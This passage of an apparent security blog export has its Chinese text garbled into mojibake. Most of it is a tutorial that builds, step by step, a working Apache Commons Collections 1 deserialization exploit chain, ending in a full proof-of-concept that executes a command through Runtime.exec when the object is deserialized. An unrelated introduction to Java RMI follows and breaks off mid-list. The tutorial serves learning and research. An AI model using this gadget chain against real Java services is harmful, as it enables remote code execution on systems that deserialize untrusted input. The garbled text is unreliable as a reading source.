public Object next() { Map.Entry entry = (Map.Entry) iterator.next(); return new MapEntry(entry, parent); } æ¯æ¬¡éƒ½ä¼šè¿”å›å†…éƒ¨ç±»AbstractInputCheckedMapDecorator.MapEntryï¼Œæ‰€ä»¥memberValueå³AbstractInputCheckedMapDecorator.MapEntryã€‚\næ¯æ¬¡memberValueéƒ½ä¼šè®¿é—®parent.checkSetValue() \u0026mdash;\u0026gt; å³memberValues.checkSetValue() \u0026mdash;\u0026gt; å³outerMap.checkSetValue() \u0026mdash;\u0026gt; å³TransformedMap.checkSetValue()\nè‡³æ­¤ï¼Œå½¢æˆRCEé“¾è·¯ã€‚\nåˆ¶ä½œå®Œæ•´POC Demo ç®€æ˜“ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class CommonC1dm { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } æ³¨é‡Šæ‰14è¡Œæ‰‹åŠ¨è§¦å‘\næ·»åŠ ä»£ç ï¼Œæ„é€ AnnotationInvocationHandlerå¯¹è±¡ï¼Œå¹¶å°†å…¶ååºåˆ—åŒ–ï¼Œç„¶åæ‰‹åŠ¨è§¦å‘ååºåˆ—åŒ–\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Annotation; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonC2dm { public static void main(String[] args) throws Exception { //è®¾ç½®ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); //è®¾ç½®TransformedMap Map innerMap = new HashMap(); // innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //æ„é€ AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // Object obj = construct.newInstance(Retention.class, outerMap); Object obj = construct.newInstance(Annotation.class, outerMap); //åºåˆ—åŒ–å¯¹è±¡ ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); //æ‰‹åŠ¨è§¦å‘ååºåˆ—åŒ– ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } è¿è¡Œå‘ç°æŠ¥é”™\næ„é€ æ­£ç¡®çš„AnnotationInvocationHandler 1 2 3 4 5 6 //æ„é€ AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); Object obj = construct.newInstance(Annotation.class, outerMap); ç¬¬å…­è¡Œçš„Annotation.classæŠ¥é”™ï¼Œä»£è¡¨ä¸èƒ½éšä¾¿æ”¾å…¥classã€‚Annotation.classæ¥è‡ªjava.lang.annotationåŒ…ï¼Œæ‰€ä»¥å…¨å±€æœç´¢@interface\næœç´¢@interfaceæ˜¯å› ä¸ºè¿™æ˜¯Annotation.classçš„ç»§æ‰¿æ–¹å¼\næœ‰å¦‚ä¸‹å‡ ä¸ªï¼Œæ‰€ä»¥æŒ‘é€‰ä¸€ä¸ªï¼Œä¾‹å¦‚Native.classå°è¯•ï¼ŒæŠ¥é”™è§£å†³ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªæŠ¥é”™\nè§£å†³ä¸å¯ååºåˆ—åŒ– å‘ç°æŠ¥é”™\n1 Exception in thread \u0026#34;main\u0026#34; java.io.NotSerializableException: java.lang.Runtime Runtimeä¸æ”¯æŒååºåˆ—åŒ–ï¼Œæ²¡æœ‰å®ç°ååºåˆ—åŒ–æ¥å£java.io.Serializableï¼Œæ‰€ä»¥ä½¿ç”¨åå°„è·å–Runtimeç±»å¯¹è±¡ï¼Œäºæ˜¯ä¿®æ”¹\n1 new ConstantTransformer(Runtime.getRuntime()), ä¸º\n1 2 3 4 5 6 7 8 new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), ä»¥è·å–Runtimeç¤ºä¾‹å¯¹è±¡\næ­¤åå®Œæ•´ä»£ç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Annotation; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonC2dm { public static void main(String[] args) throws Exception { //è®¾ç½®ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); //è®¾ç½®TransformedMap Map innerMap = new HashMap(); // innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //æ„é€ AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // Object obj = construct.newInstance(Retention.class, outerMap); Object obj = construct.newInstance(Annotation.class, outerMap); //åºåˆ—åŒ–å¯¹è±¡ ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); //æ‰‹åŠ¨è§¦å‘ååºåˆ—åŒ– ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } è§£å†³BUG æ— æ³•è¿›å…¥forå¾ªç¯ ä½†æ­¤æ—¶ä¾æ—§æ— æ³•è§¦å‘RCEçš„æ‰§è¡Œï¼Œä¸ºä»€ä¹ˆï¼Œè®©æˆ‘ä»¬è·Ÿè¸ªä¸€ä¸‹æ•°æ®æ‰§è¡Œæµ\nå‘ç°è¿™ä¸€è¡Œforå¾ªç¯å¹¶ä¸èƒ½å–å‡ºå€¼æ¥è¿›å…¥å¾ªç¯\næ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨memberValuesé‡Œé¢ï¼Œå³outerMapé‡Œæ·»åŠ é”®å€¼å¯¹æ¥è¿›å…¥å¾ªç¯\næˆ‘ä»¬å‘ç°å¦‚æœä»£ç åœ¨è®¾ç½®TransformedMapè¿™ä¸€æ­¥é‡Œçš„outermapæ·»åŠ é”®å€¼å¯¹ï¼Œä¼šç›´æ¥å¯¼è‡´RCEè§¦å‘ï¼Œä½†ä¸æ˜¯ç»è¿‡ååºåˆ—åŒ–ï¼Œè€Œæ˜¯å›åˆ°äº†æ‰‹åŠ¨è§¦å‘çš„æ–¹å¼ã€‚\n1 2 3 4 5 //è®¾ç½®TransformedMap Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;aaaaa\u0026#34;, \u0026#34;bbbbb\u0026#34;); æ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨ï¼Œåœ¨innerMapé‡Œæ·»åŠ ï¼Œè¿™æ ·å°±èƒ½ä¿è¯è®¡ç®—å™¨ä¸ä¼šåœ¨æ²¡æœ‰è§¦å‘ååºåˆ—åŒ–payloadçš„åœ°æ–¹å‡ºç°ï¼Œå¦‚ä¸‹\næ— æ³•è¿›å…¥ifåˆ¤æ–­ å¦‚å›¾ï¼Œå³ä½¿è¿›å…¥forå¾ªç¯åï¼Œè¿˜æ˜¯æ— æ³•åˆ°è¾¾memberValue.setValueè¿™æ¡è§¦å‘è¯­å¥ï¼ŒmemberTypeéœ€è¦ä¸ä¸ºnull\nmemberTypeæ¥æºäºmemberTypes.get(name)ï¼Œnameä¸ºstrå˜é‡ï¼Œå€¼ä¸ºaaaï¼Œå³æˆ‘ä»¬è¾“å…¥çš„Keyå€¼ï¼ŒmemberTypesæ¥æºäº\n1 Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); å¯ä»¥çœ‹åˆ°åœ¨Debugæƒ…å†µä¸‹ï¼Œsize=0ï¼Œå³æ²¡æœ‰ä»annotationType.memberTypes()ä¸­å–å‡ºæœ‰æ•ˆå€¼ã€‚\nannotationType.memberTypes()æºç å¦‚ä¸‹\n1 2 3 public Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes() { return memberTypes; } ç›´æ¥è¿”å›memberTypesï¼Œçœ‹å®šä¹‰\n1 private final Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes; finalç±»å‹ï¼Œä»£è¡¨åªæœ‰åˆå§‹åŒ–èµ‹å€¼ï¼ŒæŸ¥çœ‹åˆå§‹åŒ–èµ‹å€¼\n1 2 3 4 5 6 7 8 9 Method[] methods = AccessController.doPrivileged(new PrivilegedAction\u0026lt;Method[]\u0026gt;() { public Method[] run() { // Initialize memberTypes and defaultValues return annotationClass.getDeclaredMethods(); } }); memberTypes = new HashMap\u0026lt;String,Class\u0026lt;?\u0026gt;\u0026gt;(methods.length+1, 1.0f); æ¥è‡ªäºmethodsï¼Œmethodsä¼šå»getDeclaredMethods()ï¼Œè·å–å£°æ˜çš„æ‰€æœ‰Methodsï¼Œæ‰€ä»¥å¦‚æœç±»æ²¡æœ‰å£°æ˜æ–¹æ³•ï¼ŒmemberTypes.sizeå§‹ç»ˆä¸º0ã€‚\nä¸Šæ–‡æœç´¢åˆ°çš„å®šä¹‰ç±»ä¸­ï¼Œåªæœ‰Repeatable.classï¼ŒRetention.classï¼ŒTarget.classå…·æœ‰æ–¹æ³•\næ‰€ä»¥æ„é€ Native.classæ— æ³•æ»¡è¶³æ¡ä»¶ï¼Œæ¢æˆRepeatable.classè¯•è¯•\nå®Œæ•´æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Repeatable; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonC2dm { public static void main(String[] args) throws Exception { //è®¾ç½®ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); //è®¾ç½®TransformedMap Map innerMap = new HashMap(); innerMap.put(\u0026#34;aaaaa\u0026#34;, \u0026#34;bbbbb\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //æ„é€ AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // Object obj = construct.newInstance(Retention.class, outerMap); Object obj = construct.newInstance(Repeatable.class, outerMap); //åºåˆ—åŒ–å¯¹è±¡ ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); //æ‰‹åŠ¨è§¦å‘ååºåˆ—åŒ– ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } å‘ç°è¿˜æ˜¯æ— æ³•è¿›å…¥ifè¯­å¥ï¼Œå› ä¸ºå–å€¼çš„æ—¶å€™ï¼Œæ²¡æœ‰Keyå€¼ä¸ºaaaçš„é€‰é¡¹ï¼Œæ‰€ä»¥å°†aaaæ”¹ä¸ºvalueè¯•è¯•\næˆåŠŸè§¦å‘\nå®Œæ•´POC Demo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Repeatable; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonC2dm { public static void main(String[] args) throws Exception { //è®¾ç½®ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); //è®¾ç½®TransformedMap Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;bbbbb\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //æ„é€ AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // Object obj = construct.newInstance(Retention.class, outerMap); Object obj = construct.newInstance(Repeatable.class, outerMap); //åºåˆ—åŒ–å¯¹è±¡ ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); //æ‰‹åŠ¨è§¦å‘ååºåˆ—åŒ– ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } ç¼ºé™·-Javaé«˜ç‰ˆæœ¬æ— æ³•åˆ©ç”¨ å¤§ä½¬è¯´\næˆ‘ä»¬æ˜¯åœ¨Java 8u71ä»¥å‰çš„ç‰ˆæœ¬ä¸Šè¿›è¡Œæµ‹è¯•çš„ï¼Œåœ¨8u71ä»¥åå¤§æ¦‚æ˜¯2015å¹´12æœˆçš„æ—¶å€™ï¼ŒJavaå®˜æ–¹ä¿®æ”¹äº† sun.reflect.annotation.AnnotationInvocationHandler çš„readObjectå‡½æ•°\nä¿®æ”¹åï¼Œæˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„outerMapä¸ä¼šå†æœ‰setï¼Œputæ“ä½œï¼Œå°±ä¸ä¼šè§¦å‘transform()ï¼Œè‡ªç„¶ä¹Ÿå°±å¤±æ•ˆäº†\nå¦‚ä½•ç ´å±€ ä»”ç»†å¯¹æ¯”ysoserialä¸­çš„CC1å’Œæˆ‘ä»¬çš„CC1 Demoå¤§æœ‰ä¸åŒï¼Œæˆ‘ä»¬å°†åœ¨ä¸‹ä¸€ç« è¿›è¡ŒçŸ¥è¯†çš„è¡¥å……ä¸å­¦ä¹ \n","date":"2024-07-21T15:58:24+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240721160313033.png","permalink":"https://d4n-sec.github.io/p/cc1demo/","title":"CC1Demo"},{"content":"ä»€ä¹ˆæ˜¯RMI RMI (Remote Method Invocation) æ¨¡å‹æ˜¯ä¸€ç§åˆ†å¸ƒå¼å¯¹è±¡åº”ç”¨ï¼Œä½¿ç”¨ RMI æŠ€æœ¯å¯ä»¥ä½¿ä¸€ä¸ª JVM ä¸­çš„å¯¹è±¡ï¼Œè°ƒç”¨å¦ä¸€ä¸ª JVM ä¸­çš„å¯¹è±¡æ–¹æ³•å¹¶è·å–è°ƒç”¨ç»“æœã€‚è¿™é‡Œçš„å¦ä¸€ä¸ª JVM å¯ä»¥åœ¨åŒä¸€å°è®¡ç®—æœºä¹Ÿå¯ä»¥æ˜¯è¿œç¨‹è®¡ç®—æœºã€‚å› æ­¤ï¼ŒRMI æ„å‘³ç€éœ€è¦ä¸€ä¸ª Server ç«¯å’Œä¸€ä¸ª Client ç«¯ã€‚\nServer ç«¯é€šå¸¸ä¼šåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä½¿ä¹‹å¯ä»¥è¢«è¿œç¨‹è®¿é—®ã€‚\nè¿™ä¸ªå¯¹è±¡è¢«ç§°ä¸ºè¿œç¨‹å¯¹è±¡ã€‚Server ç«¯éœ€è¦æ³¨å†Œè¿™ä¸ªå¯¹è±¡å¯ä»¥è¢« Client è¿œç¨‹è®¿é—®ã€‚\nClient ç«¯è°ƒç”¨å¯ä»¥è¢«è¿œç¨‹è®¿é—®çš„å¯¹è±¡ä¸Šçš„æ–¹æ³•ï¼ŒClient ç«¯å°±å¯ä»¥å’Œ Server ç«¯è¿›è¡Œé€šä¿¡å¹¶ç›¸äº’ä¼ é€’ä¿¡æ¯ã€‚\nRMI åœ¨æ„å»ºä¸€ä¸ªåˆ†å¸ƒå¼åº”ç”¨æ—¶ååˆ†æ–¹ä¾¿ï¼Œå®ƒå’Œ RPC ä¸€æ ·å¯ä»¥å®ç°åˆ†å¸ƒå¼åº”ç”¨ä¹‹é—´çš„äº’ç›¸é€šä¿¡ï¼Œç”šè‡³å’Œç°åœ¨çš„å¾®æœåŠ¡æ€æƒ³éƒ½ååˆ†ç±»ä¼¼ã€‚\nRMI (Remote Method Invocation) åˆ†å¸ƒå¼å¯¹è±¡åº”ç”¨çš„è®¾è®¡å¯ä»¥æ–¹ä¾¿é¡¹ç›®çš„è§£è€¦ï¼Œå’Œå¾®æœåŠ¡ï¼ŒRPCç›¸å…³æ€æƒ³å¦‚å‡ºä¸€è¾™ã€‚\nRMIå’ŒRPCçš„ä¸åŒç‚¹å‘¢ï¼Ÿ\nRPCæ˜¯ä¸€ç§æ€æƒ³ï¼Œä¸€ç§ç±»ä¼¼åè®®çš„çº¦å®šï¼Œåªè¦æ˜¯é€šè¿‡ç½‘ç»œä»è€Œè°ƒæœ‰è¿œç«¯çš„æŸç§æœåŠ¡ï¼Œé‚£ä¹ˆè¿™å°±æ˜¯RPC\nRMIå¯ä»¥è¯´æ˜¯Javaå¯¹RPCçš„å…·ä½“å®ç°ï¼Œæˆ–è¯´RMIæ˜¯RPCçš„javaç‰ˆçš„ç»†åŒ–è¦æ±‚\nJavaä¸­æ‰€æœ‰ä¸œè¥¿çš†æ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥æ²¡æœ‰å‡½æ•°ï¼Œåªæœ‰æ–¹æ³•ï¼ˆç»‘å®šäº†å¯¹è±¡ï¼‰æ‰€ä»¥RPCçš„è§£é‡Šæ˜¯é¢å‘è¿‡ç¨‹çš„ï¼ŒRMIçš„è§£é‡Šæ˜¯é¢å‘å¯¹è±¡çš„\nä¸ç®¡æ˜¯ä½•ç§å®ç°ï¼Œæœ¬è´¨éƒ½æ˜¯ä¸ºäº†è§£å†³ä¸€ä¸ªé—®é¢˜ï¼šæˆ‘æƒ³è¦è°ƒç”¨è¿œç¨‹çš„ä¸€ä¸ªå‡½æ•°æˆ–è€…æ–¹æ³•æˆ–è€…å…¶ä»–ä»€ä¹ˆä¸œè¥¿çš„æ—¶å€™ï¼Œæˆ‘åªéœ€è¦åƒè°ƒç”¨æœ¬åœ°çš„ä¸€æ ·ï¼Œå³å¯ã€‚\nçŸ¥è¯†è¡¥å…… è¡¥å……ï¼šRPCï¼Ÿ\nRPCæ˜¯è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRemote Procedure Callï¼‰ RPC çš„ä¸»è¦åŠŸèƒ½ç›®æ ‡æ˜¯è®©æ„å»ºåˆ†å¸ƒå¼è®¡ç®—ï¼ˆåº”ç”¨ï¼‰æ›´å®¹æ˜“ï¼Œåœ¨æä¾›å¼ºå¤§çš„è¿œç¨‹è°ƒç”¨èƒ½åŠ›æ—¶ä¸æŸå¤±æœ¬åœ°è°ƒç”¨çš„è¯­ä¹‰ç®€æ´æ€§ã€‚ä¸ºå®ç°è¯¥ç›®æ ‡ï¼ŒRPC æ¡†æ¶éœ€æä¾›ä¸€ç§é€æ˜è°ƒç”¨æœºåˆ¶ï¼Œè®©ä½¿ç”¨è€…ä¸å¿…æ˜¾å¼çš„åŒºåˆ†æœ¬åœ°è°ƒç”¨å’Œè¿œç¨‹è°ƒç”¨ã€‚\nRPCçš„å‡ºç°å¯ä»¥ä½¿å¾—ç¨‹åºç›´æ¥åƒè°ƒç”¨æœ¬åœ°å‡½æ•°ä¸€æ ·è°ƒç”¨è¿œç¨‹çš„æ–¹æ³•ï¼Œå¦‚æœè°ƒç”¨è¿œç¨‹æ–¹æ³•æ—¶è®¾è®¡åˆ°çš„ä¼ å…¥å‚æ•°æ˜¯ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ä¼šæ¶‰åŠåˆ°åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€‚\næ¯”å¦‚éœ€è¦å°†Apple a ä¸­çš„ name æˆå‘˜å˜é‡æå–å¤„ç†åè¿”å›å¤„ç†åçš„Apple a1\nä¸€æ¬¡å®Œæ•´çš„RPCé€»è¾‘\nåˆ°æ­¤ï¼Œå®Œæ•´çš„rpcé€»è¾‘åº”è¯¥å°±æ˜¯è¿™æ ·çš„ï¼š\nclientè¿›è¡Œconnectè¿æ¥ ï¼ˆåˆ›å»ºè¿æ¥ï¼Œå¦‚æœéœ€è¦å¯é ç¬¬ä¸€ï¼Œå°±é€‰æ‹©TCPè¿æ¥ï¼‰ clientåºåˆ—åŒ–reqï¼ˆå¦åˆ™æ— æ³•ä¼ è¾“ï¼‰ clientæ ¹æ®çº¦å®šçš„åè®®ç¼–ç ï¼Œå‘serverå‘é€ç¼–ç åçš„æ•°æ®ï¼ˆç¼–ç æ˜¯ä¸ºäº†é˜²æ­¢ä¼ è¾“å‡ºé”™ï¼‰ serveræ¥æ”¶åˆ°æ•°æ®ï¼Œè§£ç å¾—åˆ°æ–¹æ³•åå’Œåºåˆ—åŒ–è¿‡åçš„reqäºŒè¿›åˆ¶æµ serveræ ¹æ®æ–¹æ³•åæ‰¾åˆ°reqçš„ç±»å‹ï¼Œååºåˆ—åŒ–å¾—åˆ°reqå¯¹è±¡ serverè°ƒç”¨æœ¬åœ°æ–¹æ³•å¾—åˆ°res serveråºåˆ—åŒ–res serveræ ¹æ®çº¦å®šçš„åè®®ç¼–ç å¹¶å‘é€æ•°æ® clientæ¥æ”¶åˆ°æ•°æ®å¹¶è§£ç  clientååºåˆ—åŒ–å¾—åˆ°res RPCçš„ç›®æ ‡å°±æ˜¯å°†è¿™äº›æ­¥éª¤éƒ½å°è£…èµ·æ¥ï¼Œè®©ç”¨æˆ·å¯¹è¿™äº›ç»†èŠ‚é€æ˜ï¼Œç”¨æˆ·åªçŸ¥é“è°ƒç”¨çš„è¾“å…¥ï¼Œå¹¶æœ€åå¤„ç†è¾“å‡ºå³å¯\nRMIæ˜¯æ€ä¹ˆè®¾è®¡çš„ RMI ä¸­æ˜¯é€šè¿‡åœ¨å®¢æˆ·ç«¯çš„Stubå¯¹è±¡ä½œä¸ºè¿œç¨‹æ¥å£è¿›è¡Œè¿œç¨‹æ–¹æ³•çš„è°ƒç”¨ã€‚ æ¯ä¸ªè¿œç¨‹æ–¹æ³•éƒ½å…·æœ‰æ–¹æ³•ç­¾åã€‚ å¦‚æœä¸€ä¸ªæ–¹æ³•åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä½†æ˜¯æ²¡æœ‰ç›¸åŒ¹é…çš„ç­¾åè¢«æ·»åŠ åˆ°è¿™ä¸ªè¿œç¨‹æ¥å£(stub)ä¸Šï¼Œé‚£ä¹ˆè¿™ä¸ªæ–°æ–¹æ³•å°±ä¸èƒ½è¢«RMIå®¢æˆ·æ–¹æ‰€è°ƒç”¨ã€‚\nåŸºæœ¬æµç¨‹å›¾ï¼š\nä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒClient ç«¯æœ‰ä¸€ä¸ªè¢«ç§° Stub çš„ä¸œè¥¿ï¼Œæœ‰æ—¶ä¹Ÿä¼šè¢«æˆä¸ºå­˜æ ¹ï¼Œå®ƒæ˜¯ RMI Client çš„ä»£ç†å¯¹è±¡ï¼ŒStub çš„ä¸»è¦åŠŸèƒ½æ˜¯è¯·æ±‚è¿œç¨‹æ–¹æ³•æ—¶æ„é€ ä¸€ä¸ªä¿¡æ¯å—ï¼ŒRMI åè®®ä¼šæŠŠè¿™ä¸ªä¿¡æ¯å—å‘é€ç»™ Server ç«¯ã€‚\nè¿™é‡Œå¯ä»¥äº†è§£åˆ°çš„ä¸œè¥¿\nClientè¢«Stubï¼ˆå­˜æ ¹ï¼‰ä»£ç†ï¼Œæ‰€ä»¥ Client çœ¼ä¸­åªæœ‰ Stubã€‚å³ç›¸å¯¹äºClientï¼Œå…·ä½“å®ç°ç»†èŠ‚è¢«Stubéšè—ã€‚ Stub ä¼šè¯·æ±‚è¿œç¨‹æ–¹æ³•ï¼Œå¹¶åœ¨è¿™æ—¶å‘é€ä¸€ä¸ªä¿¡æ¯å— ä¿¡æ¯å—æ˜¯Stubæ„é€ çš„ è¿™ä¸ªä¿¡æ¯å—ç”±å‡ ä¸ªéƒ¨åˆ†ç»„æˆï¼š\nè¿œç¨‹å¯¹è±¡æ ‡è¯†ç¬¦ã€‚ è°ƒç”¨çš„æ–¹æ³•æè¿°ã€‚ ç¼–ç»„åçš„å‚æ•°å€¼ï¼ˆRMIåè®®ä¸­ä½¿ç”¨çš„æ˜¯å¯¹è±¡åºåˆ—åŒ–ï¼‰ å°è¯•ç†è§£è¿™ä¸ªä¿¡æ¯å—çš„è¯ï¼Œä¿¡æ¯å—å†…å®¹çš„ä½œç”¨åˆ†åˆ«ä¸º\nå°è¯•æŒ‡å®šä¸€ä¸ªå”¯ä¸€çš„å¯¹è±¡ æŒ‡å®šå”¯ä¸€æ–¹æ³• ä¼ é€’å‚æ•°ï¼ˆå‚æ•°å¦‚æœæ˜¯å¯¹è±¡çš„è¯ \u0026ndash; å…¶å®JAVAé‡Œä¸‡ç‰©çš†å¯¹è±¡ \u0026ndash; éœ€è¦åºåˆ—åŒ–å¯¹è±¡ï¼‰ å¦‚æœåœ¨æœ¬åœ°è°ƒç”¨çš„è¯å®¹æ˜“å®ç°ï¼Œè¿œç¨‹è°ƒç”¨å°±éœ€è¦æŒ‡å®šå”¯ä¸€æ€§\n1 2 3 4 éšå­¦çš„ç–‘é—®ï¼Ÿ 1. å¯ä»¥æŒ‡å®šé™æ€ç±»å—ï¼Ÿ 2. ä¸€å®šè¦ç¡®å®šæ˜¯æŸä¸€ä¸ªå¯¹è±¡æ‰å¯ä»¥å— 3. 